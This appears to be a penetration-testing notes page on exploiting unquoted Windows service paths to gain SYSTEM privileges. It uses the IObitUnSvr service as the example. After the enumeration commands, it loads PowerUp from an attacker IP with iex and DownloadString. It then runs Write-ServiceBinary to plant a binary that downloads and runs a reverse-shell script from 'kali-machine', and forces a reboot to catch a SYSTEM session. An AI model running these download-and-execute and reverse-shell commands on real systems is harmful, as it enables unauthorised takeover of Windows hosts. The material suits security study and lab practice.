---
description: Unquoted Service Paths – Windows Privilege Escalation
---

# Unquoted Service Path

In simple terms, when a service is created whose executable path contains spaces and isn't enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).

### Manual Checks

Check service without quotes:

{% code overflow="wrap" %}
```powershell
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName | fl
```
{% endcode %}

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9ULjlxyh9cZBBJjUL8cZVu3M-7qFG7meVAxsW4FiJEJw60hrqTNJGp5JKIDuJAgvA8b_uA7VwEJRPCVKyNRrdcuArrecDjMPoQHkM-29CA9ps9qGvEA5zZ1LnzRLLqBK9fVsl-gkmdgO-ZJEGg3ekkKEldE6pnQqUG7ZnYN3YZjNaHIzq8cJ9aC7B6AA/s1100" alt=""><figcaption><p>Manual check</p></figcaption></figure>

Check File or Directory Permissions:

{% code overflow="wrap" %}
```powershell
Get-ACL -Path 'C:\Program Files (x86)\IObit' | fl
```
{% endcode %}

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAHSEWYdPfXwrMzTr-rDd_Q4zjlAZYNIKOH_T_Rp9rUsHAlXVyRsLtDaQUg7xag6RSFHKI9PD9Ya9oJxXVOnRXIu3TSBqvkOkINizMDsTxTl85XfoFkwRjBe2XxgMyEnChww1U_0UsYnDR1CUUovVMS9pQZ-rZpDWnNlYG4lr4Ju1P-VcWorBVqAnRTdA/s1246" alt=""><figcaption><p>Check directory permissions</p></figcaption></figure>

Check Service Permissions:

{% code overflow="wrap" %}
```powershell
Get-CimInstance -ClassName Win32_Service -Filter "Name = 'IObitUnSvr'" | Select-Object *
```
{% endcode %}

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggc4bxxV7hWZkUevIcBdiEr5IqyJHQRrGSVR3Ew5vQdV7pXefBeEMIEGf_2NYc3t6FQe9RqTdaHN5tyvF97-cgq8euiqcnT8sd8TODAfJoqXUtYT3ypbs25gY1uM1G5W9gBq5pIxXD0f7Nm-w2nzBV8l072vNTaXO-7YkblmSQFrGKLIn1eoq19iwim9E/s1200" alt=""><figcaption><p>Check service details</p></figcaption></figure>

### Unquoted Service Path with PowerUp

First, import PowerUp.ps1 to memory.

{% code overflow="wrap" %}
```powershell
iex ((New-Object Net.WebClient).DownloadString('http://192.168.45.243/OSEP/powershell/PowerUp.ps1'))
```
{% endcode %}

Then, check for privilege escalation vectors using this command:

```powershell
Invoke-AllChecks | fl
```

Alternatively, for checking unquoted service paths specifically, use this command:

{% code overflow="wrap" %}
```powershell
Get-UnquotedService | fl
```
{% endcode %}

Example output:

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjK2LaEmmu6Tbxf0wxyKX7Y_3_z_LGYLG125rC737IPRZP3hTykFedpcrBlkfpSTfbm25LR8LT31Zi2vm8E9fuQQnO0dHkZbVsmgafiF3zSKP8xy-I4v4QhTknDt55UQfwVji8MGOBfLwEVIdggT_zhpm4G9w4yOO-o5o-wUWWH8ZfXdQRxwwJvhI_cWTM/s1000" alt=""><figcaption><p>Vulnerable Service</p></figcaption></figure>

For detail information about the vulnerable service, use this command:

```powershell
Get-ServiceDetail -Name IObitUnSvr | Select-object *
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVvC5lZFNE3MlrI8KYn4O_ELE7h0ViBEmn48GBVOO0X3f10C8xX5wYelLf9EnfWjVHXesysZ0VCb161VK_W385PrSPgzvoBuVZCr3zH8OLb9f4wrk1dZWNiZwR9nK00XK94y6c3sGByqoGN-w7oMZJChQ1CgLXLooi8uGcvy3qpcJ9QazD4e-OlJ3JiNQ/s1200" alt=""><figcaption><p>Service Details</p></figcaption></figure>

Now, for abusing the service, you can use Write-ServiceBinary command:

{% code overflow="wrap" %}
```powershell
Write-ServiceBinary -Name IObitUnSvr -Path "C:\Program Files (x86)\IObit\IObit.exe" -Command "powershell iex ((New-Object Net.WebClient).DownloadString('http://kali-machine/revshell.ps1'))" | fl
```
{% endcode %}

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZNdkk1NgkIZ-Gp45SRhTPdY3mpPlt6DLm5cyimOTIXYJLCl885s8MUUZux3cWN6-rezWhhbfxB5c9WRgWP9_dUp7TZSR30JxN5sMalw_UqVsfhfs_NMKA0K5GdFUa7BFOwPp0uuqM_AFSy1mhPo-jV_nkTjX0rO43aYqQ0mQ_kIq4KoRoZD_bvkK8AjY/s1200" alt=""><figcaption><p>Write-ServiceBinary</p></figcaption></figure>

Basically, the above command will replace the original files with a malicious file that contains a reverse shell command.

If you have ability to restart the service, you can run:

```powershell
Stop-Service -Name 'IObitUnSvr'
Start-Service -Name 'IObitUnSvr'
```

But, since you don't have the privilege to restart the service (CanRestart = False), you can reboot the machine since the service is set to autostart.

```bash
shutdown -r -t 0
```

Now, your netcat listener will have a session with the NT\SYSTEM user.

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8zqxQ_QymJMlPFkcSDdugZ472sJv4H2HdySLU2LJPV2qnMfaC5uF2mvq5AeAzYfdpfCFnBddUtiO4ZC4SZq1zNh3-XyfL0Kc7bAfKEUh1zaMOpzJjksuX1QmPC88jbs0SEgIKWJt27qzFCZjk0xpB2_2_kdNOOExqjkwFkVW9FtlUtHZWarFboVRk2M4/s1100" alt=""><figcaption><p>Shell as Admin</p></figcaption></figure>
